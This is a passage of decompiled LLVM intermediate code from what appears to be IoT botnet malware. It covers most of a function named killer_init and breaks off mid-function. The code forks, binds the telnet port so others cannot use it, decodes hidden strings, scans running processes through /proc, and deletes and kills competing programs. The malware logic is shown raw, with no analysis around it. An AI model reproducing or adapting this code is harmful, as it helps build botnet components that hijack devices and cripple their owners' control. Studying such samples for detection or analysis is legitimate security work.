  uselistorder i32 %v0_dfec, { 1, 0 }
  uselistorder i32 %v0_dfc879, { 1, 0 }
  uselistorder i32 %v0_e304, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_dff884, { 1, 2, 0 }
  uselistorder i32 %v1_dfc855, { 1, 0 }
  uselistorder i32 %v2_dfac, { 1, 0 }
  uselistorder i32 %v1_dfa8, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_df68, { 0, 2, 1 }
  uselistorder i32 %v0_df6816, { 1, 0 }
  uselistorder i32 %v1_df34, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_dec4, { 1, 2, 0 }
  uselistorder i32 %v0_de7c, { 1, 0 }
  uselistorder i32 %v2_de78, { 1, 0, 2 }
  uselistorder i8* %v3_de60, { 1, 0, 2 }
  uselistorder i32 %v2_de40, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_e31c, { 1, 0 }
  uselistorder label %dec_label_pc_e2f0, { 1, 0 }
  uselistorder label %dec_label_pc_e2dc, { 1, 0 }
  uselistorder label %dec_label_pc_e2d0, { 1, 0 }
  uselistorder label %dec_label_pc_e2c4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e2ac, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e1bc, { 1, 0 }
  uselistorder label %dec_label_pc_e1bcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e1a4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e0c0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e0b0.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e044, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dfec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dfd0, { 1, 0 }
  uselistorder label %dec_label_pc_df74, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ded8.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_df28, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_def0, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %v3_e360 = load i32, i32* @r4, align 4
  %v6_e360 = load i32, i32* @r5, align 4
  %v9_e360 = load i32, i32* @r6, align 4
  %v12_e360 = load i32, i32* @r7, align 4
  %v15_e360 = load i32, i32* @r8, align 4
  %v18_e360 = load i32, i32* @sb, align 4
  %v21_e360 = load i32, i32* @sl, align 4
  %v24_e360 = load i32, i32* @fp, align 4
  %v27_e360 = load i32, i32* @lr, align 4
  %v2_e370 = call i32 @__GI_time(i32* null)
  store i32 %v2_e370, i32* @r7, align 4
  %v0_e378 = call i32 @__libc_fork()
  %v7_e37c = icmp eq i32 %v0_e378, -1
  %. = zext i1 %v7_e37c to i32
  %tmp220 = icmp slt i32 %v0_e378, 1
  %storemerge184 = select i1 %tmp220, i32 %., i32 1
  store i32 %storemerge184, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_26e58.112 to i32), i32* %r3.global-to-local, align 4
  %v2_e398 = icmp eq i32 %storemerge184, 0
  store i32 %v0_e378, i32* @global_var_26e58.112, align 4
  br i1 %v2_e398, label %dec_label_pc_e3b4, label %dec_label_pc_e3a4

dec_label_pc_e3a4:                                ; preds = %dec_label_pc_e52c, %dec_label_pc_e410, %entry
  %v1_e3b0 = phi i32 [ %v2_e4c8, %dec_label_pc_e410 ], [ %v0_e378, %entry ], [ 0, %dec_label_pc_e52c ]
  store i32 %v3_e360, i32* @r4, align 4
  store i32 %v6_e360, i32* @r5, align 4
  store i32 %v9_e360, i32* @r6, align 4
  store i32 %v12_e360, i32* @r7, align 4
  store i32 %v15_e360, i32* @r8, align 4
  store i32 %v18_e360, i32* @sb, align 4
  store i32 %v21_e360, i32* @sl, align 4
  store i32 %v24_e360, i32* @fp, align 4
  store i32 %v27_e360, i32* @lr, align 4
  ret i32 %v1_e3b0

dec_label_pc_e3b4:                                ; preds = %entry
  %v2_e3b4 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_e3b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v1_e3c8 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_e3b4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_e3dc = load i32, i32* @r5, align 4
  store i32 %v0_e3dc, i32* %r2.global-to-local, align 4
  %v3_e3e4 = call i32 @socket(i32 2, i32 1, i32 %v0_e3dc)
  %v7_e3e8 = icmp eq i32 %v3_e3e4, -1
  store i32 %v3_e3e4, i32* @r4, align 4
  br i1 %v7_e3e8, label %dec_label_pc_e410, label %dec_label_pc_e3f4

dec_label_pc_e3f4:                                ; preds = %dec_label_pc_e3b4
  %v2_e3f8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_e3f8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e400 = call i32 @bind(i32 %v3_e3e4, i32 %v2_e3f8, i32 16)
  %v0_e404 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e40c = call i32 @listen(i32 %v0_e404, i32 1)
  br label %dec_label_pc_e410

dec_label_pc_e410:                                ; preds = %dec_label_pc_e3b4, %dec_label_pc_e3f4
  %v1_e414 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e41c = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_2433c.118 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26e54.120 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e41c, i32* %r2.global-to-local, align 4
  %v0_e42c = load i32, i32* @r5, align 4
  %v1_e42c = trunc i32 %v0_e42c to i8
  %v3_e42c = inttoptr i32 %v0_e41c to i8*
  store i8 %v1_e42c, i8* %v3_e42c, align 1
  %v0_e434 = load i32, i32* @r5, align 4
  %v1_e434 = load i32, i32* %r3.global-to-local, align 4
  %v2_e434 = inttoptr i32 %v1_e434 to i32*
  store i32 %v0_e434, i32* %v2_e434, align 4
  %v0_e438 = load i32, i32* %r2.global-to-local, align 4
  %v1_e438 = load i32, i32* %r1.global-to-local, align 4
  %v2_e438 = inttoptr i32 %v1_e438 to i32*
  store i32 %v0_e438, i32* %v2_e438, align 4
  %v1_e43c = call i32 @table_unlock_val(i32 6)
  %v1_e444 = call i32 @table_unlock_val(i32 7)
  %v2_e44c = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_e44c, i32* %r2.global-to-local, align 4
  %v0_e450 = load i32, i32* @r5, align 4
  store i32 %v0_e450, i32* %r1.global-to-local, align 4
  %v2_e45c = inttoptr i32 %v0_e450 to i32*
  %v3_e45c = call i32 @table_retrieve_val(i32 6, i32* %v2_e45c)
  %v1_e464 = add i32 %v2_e44c, -52
  store i32 %v1_e464, i32* %r3.global-to-local, align 4
  store i32 %v3_e45c, i32* %r1.global-to-local, align 4
  store i32 %v1_e464, i32* @r0, align 4
  %v2_e474 = inttoptr i32 %v1_e464 to i8*
  %v3_e474 = call i32 @util_strcpy(i8* %v2_e474, i32 %v3_e45c)
  %v2_e47c = add i32 %v3_e474, %v1_e464
  store i32 %v2_e47c, i32* @r4, align 4
  %v1_e480 = call i32 @__getpid(i32 %v3_e474)
  %v2_e488 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_e488, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_e490 = trunc i32 %v1_e480 to i8
  %v4_e490 = call i32 @util_itoa(i8 %v3_e490, i32 10, i32 %v2_e488)
  store i32 %v4_e490, i32* %r1.global-to-local, align 4
  %v0_e498 = load i32, i32* @r4, align 4
  store i32 %v0_e498, i32* @r0, align 4
  %v2_e49c = inttoptr i32 %v0_e498 to i8*
  %v3_e49c = call i32 @util_strcpy(i8* %v2_e49c, i32 %v4_e490)
  %v0_e4a0 = load i32, i32* @r5, align 4
  store i32 %v0_e4a0, i32* %r1.global-to-local, align 4
  %v1_e4a4 = load i32, i32* @r4, align 4
  %v2_e4a4 = add i32 %v1_e4a4, %v3_e49c
  store i32 %v2_e4a4, i32* @r4, align 4
  %v2_e4ac = inttoptr i32 %v0_e4a0 to i32*
  %v3_e4ac = call i32 @table_retrieve_val(i32 7, i32* %v2_e4ac)
  store i32 %v3_e4ac, i32* %r1.global-to-local, align 4
  %v0_e4b4 = load i32, i32* @r4, align 4
  store i32 %v0_e4b4, i32* @r0, align 4
  %v2_e4b8 = inttoptr i32 %v0_e4b4 to i8*
  %v3_e4b8 = call i32 @util_strcpy(i8* %v2_e4b8, i32 %v3_e4ac)
  %v0_e4bc = load i32, i32* @r5, align 4
  store i32 %v0_e4bc, i32* %r1.global-to-local, align 4
  store i32 %v3_e4b8, i32* @r6, align 4
  %v2_e4c8 = call i32 @__libc_open(i32 %v1_e464, i32 %v0_e4bc)
  %v7_e4cc = icmp eq i32 %v2_e4c8, -1
  br i1 %v7_e4cc, label %dec_label_pc_e3a4, label %dec_label_pc_e4d4

dec_label_pc_e4d4:                                ; preds = %dec_label_pc_e410
  %v1_e4d4 = call i32 @__GI___libc_close(i32 %v2_e4c8)
  %v1_e4dc = call i32 @table_lock_val(i32 6)
  %v1_e4e4 = call i32 @table_lock_val(i32 7)
  store i32 ptrtoint (i32* @global_var_26e54.120 to i32), i32* %r3.global-to-local, align 4
  %v2_e4f0 = load i32, i32* @global_var_26e54.120, align 4
  store i32 %v2_e4f0, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_e4fc = call i32 @readlink(i32 %v1_e464, i32 %v2_e4f0, i32 4095)
  %v7_e500 = icmp eq i32 %v3_e4fc, -1
  br i1 %v7_e500, label %.thread9, label %bb223

bb223:                                            ; preds = %dec_label_pc_e4d4
  %v3_e508 = load i32, i32* @global_var_26e54.120, align 4
  store i32 %v3_e508, i32* %r3.global-to-local, align 4
  %v1_e50c = load i32, i32* @r5, align 4
  %v2_e50c = trunc i32 %v1_e50c to i8
  %v5_e50c = add i32 %v3_e508, %v3_e4fc
  %v6_e50c = inttoptr i32 %v5_e50c to i8*
  store i8 %v2_e50c, i8* %v6_e50c, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_e4d4, %bb223
  %v0_e514 = load i32, i32* @r6, align 4
  %v1_e514 = load i32, i32* @r4, align 4
  %v1_e464.neg = sub i32 52, %v2_e44c
  %v2_e514 = add i32 %v1_e464.neg, %v0_e514
  %v2_e518 = add i32 %v2_e514, %v1_e514
  store i32 %v2_e518, i32* %r1.global-to-local, align 4
  %v2_e51c = call i32 @util_zero(i32 %v1_e464, i32 %v2_e518)
  %v0_e520 = load i32, i32* @r7, align 4
  store i32 %v0_e520, i32* @r4, align 4
  %v0_e524 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_e630 = ptrtoint i32* %stack_var_-156 to i32
  %v2_e634 = bitcast i32* %stack_var_-156 to i8*
  %v2_e680 = ptrtoint i32* %stack_var_-220 to i32
  %v2_e684 = bitcast i32* %stack_var_-220 to i8*
  %v2_e7f0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_e800 = ptrtoint i32* %stack_var_-48 to i32
  %v2_e814 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e824 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e83c = ptrtoint i32* %stack_var_-60 to i32
  %v2_e850 = ptrtoint i32* %stack_var_-8412 to i32
  br label %dec_label_pc_e52c

dec_label_pc_e52c:                                ; preds = %dec_label_pc_e5f4, %.thread9
  %stack_var_-8428.0 = phi i32 [ %v0_e524, %.thread9 ], [ %stack_var_-8428.3, %dec_label_pc_e5f4 ]
  %v1_e530 = call i32 @table_unlock_val(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e53c = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e540 = call i32 @__GI_opendir(i32 %v3_e53c)
  store i32 %v1_e540, i32* @r8, align 4
  %v2_e544 = icmp eq i32 %v1_e540, 0
  br i1 %v2_e544, label %dec_label_pc_e3a4, label %dec_label_pc_e54c

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e52c
  %v1_e550 = call i32 @table_lock_val(i32 6)
  %v0_e554119 = load i32, i32* @r8, align 4
  %v1_e558120 = inttoptr i32 %v0_e554119 to i32*
  %v2_e558121 = call i32 @__GI_readdir(i32* %v1_e558120)
  %v2_e55c123 = icmp eq i32 %v2_e558121, 0
  br i1 %v2_e55c123, label %dec_label_pc_e5f4, label %dec_label_pc_e564.preheader

dec_label_pc_e564.preheader:                      ; preds = %dec_label_pc_e54c, %dec_label_pc_e554.backedge
  %v0_e564134 = phi i32 [ %v2_e558, %dec_label_pc_e554.backedge ], [ %v2_e558121, %dec_label_pc_e54c ]
  %stack_var_-8428.1124 = phi i32 [ %stack_var_-8428.1.be, %dec_label_pc_e554.backedge ], [ %stack_var_-8428.0, %dec_label_pc_e54c ]
  br label %dec_label_pc_e564

dec_label_pc_e564:                                ; preds = %dec_label_pc_e564.preheader, %dec_label_pc_e5dc
  %v0_e574 = phi i32 [ %v2_e5e8, %dec_label_pc_e5dc ], [ %v0_e564134, %dec_label_pc_e564.preheader ]
  %stack_var_-8428.2 = phi i32 [ %v1_e588, %dec_label_pc_e5dc ], [ %stack_var_-8428.1124, %dec_label_pc_e564.preheader ]
  %v1_e564 = add i32 %v0_e574, 11
  %v2_e564 = inttoptr i32 %v1_e564 to i8*
  %v3_e564 = load i8, i8* %v2_e564, align 1
  %v4_e564 = zext i8 %v3_e564 to i32
  %v1_e568 = add nsw i32 %v4_e564, -48
  store i32 %v1_e568, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e568, 9
  br i1 %tmp, label %dec_label_pc_e554.backedge, label %dec_label_pc_e574

dec_label_pc_e574:                                ; preds = %dec_label_pc_e564
  store i32 %v1_e564, i32* @r6, align 4
  store i32 %v1_e564, i32* @r0, align 4
  %v1_e57c = call i32 @atol(i32 %v1_e564)
  %v0_e584 = load i32, i32* @r5, align 4
  %v1_e588 = add i32 %stack_var_-8428.2, 1
  store i32 %v1_e588, i32* %r1.global-to-local, align 4
  store i32 %v1_e57c, i32* @r7, align 4
  %v5_e594 = icmp slt i32 %v0_e584, %v1_e57c
  %v2_e604 = call i32 @__GI_time(i32* null)
  br i1 %v5_e594, label %dec_label_pc_e600, label %dec_label_pc_e598

dec_label_pc_e598:                                ; preds = %dec_label_pc_e574
  %v0_e5a0 = load i32, i32* @r4, align 4
  %v2_e5a0 = sub i32 %v2_e604, %v0_e5a0
  %v7_e5a8 = icmp slt i32 %v2_e5a0, 601
  br i1 %v7_e5a8, label %dec_label_pc_e5b0, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e598
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_e554.backedge

dec_label_pc_e5b0:                                ; preds = %dec_label_pc_e598
  %v0_e5b0 = load i32, i32* @r7, align 4
  %v7_e5b4 = icmp slt i32 %v0_e5b0, 401
  br i1 %v7_e5b4, label %dec_label_pc_e554.backedge, label %dec_label_pc_e5b8

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e5b0
  %v3_e5c0 = zext i32 %v1_e588 to i64
  %v4_e5c0 = mul nuw i64 %v3_e5c0, 3435973837
  %v3_e5c41 = udiv i64 %v4_e5c0, 34359738368
  %v3_e5c83 = mul nuw nsw i64 %v3_e5c41, 8
  %v3_e5c8 = trunc i64 %v3_e5c83 to i32
  store i32 %v3_e5c8, i32* %r3.global-to-local, align 4
  %v2_e5cc5 = mul nuw nsw i64 %v3_e5c41, 2
  %v2_e5cc = trunc i64 %v2_e5cc5 to i32
  %v2_e5d0 = add i32 %v3_e5c8, %v2_e5cc
  store i32 %v2_e5d0, i32* %r2.global-to-local, align 4
  %v9_e5d4 = icmp eq i32 %v1_e588, %v2_e5d0
  br i1 %v9_e5d4, label %dec_label_pc_e5dc, label %dec_label_pc_e554.backedge

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5b8
  %v1_e5e0 = call i32 @sleep(i32 1)
  %v0_e5e4 = load i32, i32* @r8, align 4
  %v1_e5e8 = inttoptr i32 %v0_e5e4 to i32*
  %v2_e5e8 = call i32 @__GI_readdir(i32* %v1_e5e8)
  %v2_e5ec = icmp eq i32 %v2_e5e8, 0
  br i1 %v2_e5ec, label %dec_label_pc_e5f4, label %dec_label_pc_e564

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e554.backedge, %dec_label_pc_e5dc, %dec_label_pc_e54c
  %stack_var_-8428.3 = phi i32 [ %stack_var_-8428.0, %dec_label_pc_e54c ], [ %v1_e588, %dec_label_pc_e5dc ], [ %stack_var_-8428.1.be, %dec_label_pc_e554.backedge ]
  %v0_e5f4 = load i32, i32* @r8, align 4
  %v1_e5f8 = inttoptr i32 %v0_e5f4 to i32*
  %v2_e5f8 = call i32 @__GI_closedir(i32* %v1_e5f8)
  br label %dec_label_pc_e52c

dec_label_pc_e600:                                ; preds = %dec_label_pc_e574
  %v1_e610 = call i32 @table_unlock_val(i32 6)
  %v1_e618 = call i32 @table_unlock_val(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e624 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v3_e624, i32* %r1.global-to-local, align 4
  store i32 %v2_e630, i32* @r0, align 4
  %v3_e634 = call i32 @util_strcpy(i8* %v2_e634, i32 %v3_e624)
  %v2_e640 = add i32 %v3_e634, %v2_e630
  store i32 %v2_e640, i32* %r5.global-to-local, align 4
  store i32 %v2_e640, i32* @r0, align 4
  %v0_e648 = load i32, i32* @r6, align 4
  store i32 %v0_e648, i32* %r1.global-to-local, align 4
  %v2_e64c = inttoptr i32 %v2_e640 to i8*
  %v3_e64c = call i32 @util_strcpy(i8* %v2_e64c, i32 %v0_e648)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e65c = call i32 @table_retrieve_val(i32 7, i32* null)
  store i32 %v3_e65c, i32* %r1.global-to-local, align 4
  %v1_e664 = load i32, i32* %r5.global-to-local, align 4
  %v2_e664 = add i32 %v1_e664, %v3_e64c
  store i32 %v2_e664, i32* @r0, align 4
  %v2_e668 = inttoptr i32 %v2_e664 to i8*
  %v3_e668 = call i32 @util_strcpy(i8* %v2_e668, i32 %v3_e65c)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_e674 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v3_e674, i32* %r1.global-to-local, align 4
  store i32 %v2_e680, i32* @r0, align 4
  %v3_e684 = call i32 @util_strcpy(i8* %v2_e684, i32 %v3_e674)
  store i32 %v2_e680, i32* %r2.global-to-local, align 4
  %v2_e690 = add i32 %v3_e684, %v2_e680
  store i32 %v2_e690, i32* @r5, align 4
  %v0_e694 = load i32, i32* @r6, align 4
  store i32 %v0_e694, i32* %r1.global-to-local, align 4
  store i32 %v2_e690, i32* @r0, align 4
  %v2_e69c = inttoptr i32 %v2_e690 to i8*
  %v3_e69c = call i32 @util_strcpy(i8* %v2_e69c, i32 %v0_e694)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_e69c, i32* @r4, align 4
  %v3_e6ac = call i32 @table_retrieve_val(i32 11, i32* null)
  store i32 %v3_e6ac, i32* %r1.global-to-local, align 4
  %v0_e6b4 = load i32, i32* @r4, align 4
  %v1_e6b4 = load i32, i32* @r5, align 4
  %v2_e6b4 = add i32 %v1_e6b4, %v0_e6b4
  store i32 %v2_e6b4, i32* @r0, align 4
  %v2_e6b8 = inttoptr i32 %v2_e6b4 to i8*
  %v3_e6b8 = call i32 @util_strcpy(i8* %v2_e6b8, i32 %v3_e6ac)
  %v1_e6c0 = call i32 @table_lock_val(i32 6)
  %v1_e6c8 = call i32 @table_lock_val(i32 7)
  store i32 %v1_e464, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_e6e0 = call i32 @readlink(i32 %v2_e630, i32 %v1_e464, i32 4095)
  %v7_e6e4 = icmp eq i32 %v3_e6e0, -1
  store i32 %v3_e6e0, i32* @r5, align 4
  br i1 %v7_e6e4, label %dec_label_pc_e7a8, label %dec_label_pc_e6f0

dec_label_pc_e6f0:                                ; preds = %dec_label_pc_e600
  store i32 %v1_e464, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e6f8 = add i32 %v3_e6e0, %v1_e464
  %v5_e6f8 = inttoptr i32 %v4_e6f8 to i8*
  store i8 0, i8* %v5_e6f8, align 1
  %v1_e700 = call i32 @table_unlock_val(i32 10)
  %v0_e704 = load i32, i32* @r4, align 4
  store i32 %v0_e704, i32* %r1.global-to-local, align 4
  %v2_e70c = inttoptr i32 %v0_e704 to i32*
  %v3_e70c = call i32 @table_retrieve_val(i32 10, i32* %v2_e70c)
  %v0_e710 = load i32, i32* @r5, align 4
  %v1_e710 = add i32 %v0_e710, -1
  store i32 %v1_e710, i32* @r1, align 4
  store i32 %v3_e70c, i32* %r2.global-to-local, align 4
  %v4_e71c = call i32 @util_stristr(i8* %v2_e474, i32 %v1_e710, i32 %v3_e70c)
  %v7_e720 = icmp eq i32 %v4_e71c, -1
  br i1 %v7_e720, label %dec_label_pc_e73c, label %dec_label_pc_e728

dec_label_pc_e728:                                ; preds = %dec_label_pc_e6f0
  %v1_e72c = call i32 @unlink(i32 %v1_e464)
  %v0_e730 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_e738 = call i32 @kill(i32 %v0_e730, i32 9)
  br label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_e6f0, %dec_label_pc_e728
  %v1_e740 = call i32 @table_lock_val(i32 10)
  %v1_e744 = call i32 @__getpid(i32 %v1_e740)
  store i32 %v1_e744, i32* @r0, align 4
  %v1_e748 = load i32, i32* @r7, align 4
  %v9_e748 = icmp eq i32 %v1_e744, %v1_e748
  br i1 %v9_e748, label %dec_label_pc_e774, label %dec_label_pc_e750

dec_label_pc_e750:                                ; preds = %dec_label_pc_e73c
  %v0_e750 = call i32 @getppid()
  %v1_e754 = load i32, i32* @r7, align 4
  %v9_e754 = icmp eq i32 %v0_e750, %v1_e754
  br i1 %v9_e754, label %dec_label_pc_e774, label %dec_label_pc_e75c

dec_label_pc_e75c:                                ; preds = %dec_label_pc_e750
  %v2_e764 = load i32, i32* @global_var_26e54.120, align 4
  store i32 %v2_e764, i32* %r1.global-to-local, align 4
  %v3_e768 = call i32 @util_strcmp(i8* %v2_e474, i32 %v2_e764)
  %v2_e76c = icmp eq i32 %v3_e768, 0
  br i1 %v2_e76c, label %dec_label_pc_e780, label %dec_label_pc_e75c.dec_label_pc_e774_crit_edge

dec_label_pc_e75c.dec_label_pc_e774_crit_edge:    ; preds = %dec_label_pc_e75c
  %v0_e778.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %dec_label_pc_e75c.dec_label_pc_e774_crit_edge, %dec_label_pc_e750, %dec_label_pc_e73c
  %v0_e778 = phi i32 [ %v0_e778.pre, %dec_label_pc_e75c.dec_label_pc_e774_crit_edge ], [ %v0_e750, %dec_label_pc_e750 ], [ %v1_e744, %dec_label_pc_e73c ]
  store i32 %v2_e604, i32* @r4, align 4
  store i32 %v0_e778, i32* @r5, align 4
  br label %dec_label_pc_e554.backedge

dec_label_pc_e554.backedge:                       ; preds = %dec_label_pc_e5b8, %dec_label_pc_e5b0, %dec_label_pc_e564, %dec_label_pc_e774, %dec_label_pc_ea34, %.thread10
  %stack_var_-8428.1.be = phi i32 [ %v1_e588, %dec_label_pc_ea34 ], [ %v1_e588, %dec_label_pc_e774 ], [ %v1_e588, %.thread10 ], [ %stack_var_-8428.2, %dec_label_pc_e564 ], [ %v1_e588, %dec_label_pc_e5b0 ], [ %v1_e588, %dec_label_pc_e5b8 ]
  %v0_e554 = load i32, i32* @r8, align 4
  %v1_e558 = inttoptr i32 %v0_e554 to i32*
  %v2_e558 = call i32 @__GI_readdir(i32* %v1_e558)
  %v2_e55c = icmp eq i32 %v2_e558, 0
  br i1 %v2_e55c, label %dec_label_pc_e5f4, label %dec_label_pc_e564.preheader

dec_label_pc_e780:                                ; preds = %dec_label_pc_e75c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e788 = call i32 @__libc_open(i32 %v1_e464, i32 0)
  %v7_e78c = icmp eq i32 %v2_e788, -1
  store i32 %v2_e788, i32* @r4, align 4
  br i1 %v7_e78c, label %bb224, label %.thread12

bb224:                                            ; preds = %dec_label_pc_e780
  store i32 9, i32* %r1.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e780, %bb224
  store i32 59296, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e78c, i32 ptrtoint (i32* @global_var_12db8.122 to i32))
  %v0_e7a0 = load i32, i32* @r4, align 4
  %v1_e7a4 = call i32 @__GI___libc_close(i32 %v0_e7a0)
  br label %dec_label_pc_e7a8

dec_label_pc_e7a8:                                ; preds = %dec_label_pc_e600, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e7b4 = call i32 @__libc_open(i32 %v2_e630, i32 0)
  %v7_e7b8 = icmp eq i32 %v2_e7b4, -1
  br i1 %v7_e7b8, label %dec_label_pc_ea34, label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7a8
  %v1_e7c8 = call i32 @table_unlock_val(i32 12)
  %v1_e7d0 = call i32 @table_unlock_val(i32 13)
  %v1_e7d8 = call i32 @table_unlock_val(i32 14)
  %v1_e7e0 = call i32 @table_unlock_val(i32 15)
  %v1_e7e8 = call i32 @table_unlock_val(i32 16)
  store i32 %v2_e7f0, i32* %r1.global-to-local, align 4
  %v3_e7f8 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_e800, i32* %r1.global-to-local, align 4
  store i32 %v3_e7f8, i32* @r6, align 4
  %v3_e80c = call i32 @table_retrieve_val(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_e814, i32* %r1.global-to-local, align 4
  store i32 %v3_e80c, i32* @sl, align 4
  %v3_e820 = call i32 @table_retrieve_val(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_e824, i32* %r1.global-to-local, align 4
  store i32 %v3_e820, i32* @sb, align 4
  %v3_e830 = call i32 @table_retrieve_val(i32 15, i32* nonnull %stack_var_-56)
  store i32 %v3_e830, i32* @fp, align 4
  store i32 %v2_e83c, i32* %r1.global-to-local, align 4
  %v3_e844 = call i32 @table_retrieve_val(i32 16, i32* nonnull %stack_var_-60)
  store i32 %v2_e850, i32* @r4, align 4
  store i32 %v2_e850, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_e860116 = call i32 @__libc_read(i32 %v2_e7b4)
  %tmp225 = icmp slt i32 %v1_e860116, 1
  br i1 %tmp225, label %dec_label_pc_ea68, label %dec_label_pc_e86c

dec_label_pc_e86c:                                ; preds = %dec_label_pc_e7c4, %dec_label_pc_e854.backedge
  %v0_e8f4107 = phi i32 [ %v1_e860, %dec_label_pc_e854.backedge ], [ %v1_e860116, %dec_label_pc_e7c4 ]
  store i32 %v2_e3b4, i32* %r1.global-to-local, align 4
  %v3_e870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e870, i32* @r5, align 4
  %v5_e878 = icmp slt i32 %v0_e8f4107, %v3_e870
  br i1 %v5_e878, label %dec_label_pc_e888, label %dec_label_pc_e934.lr.ph

dec_label_pc_e934.lr.ph:                          ; preds = %dec_label_pc_e86c
  %v1_e92c72 = add i32 %v0_e8f4107, -1
  store i32 %v1_e92c72, i32* %r1.global-to-local, align 4
  %v0_e934.pre = load i32, i32* @r6, align 4
  %v1_e938.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e934

dec_label_pc_e888:                                ; preds = %dec_label_pc_e92c.backedge, %dec_label_pc_e86c
  store i32 %v2_e3b4, i32* %r2.global-to-local, align 4
  %v3_e88c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_e88c, i32* @r5, align 4
  %v5_e894 = icmp slt i32 %v0_e8f4107, %v3_e88c
  br i1 %v5_e894, label %dec_label_pc_e8a4, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_e888
  %v1_e96081 = add i32 %v0_e8f4107, -1
  store i32 %v1_e96081, i32* %r1.global-to-local, align 4
  %v2_e96082 = icmp eq i32 %v0_e8f4107, 0
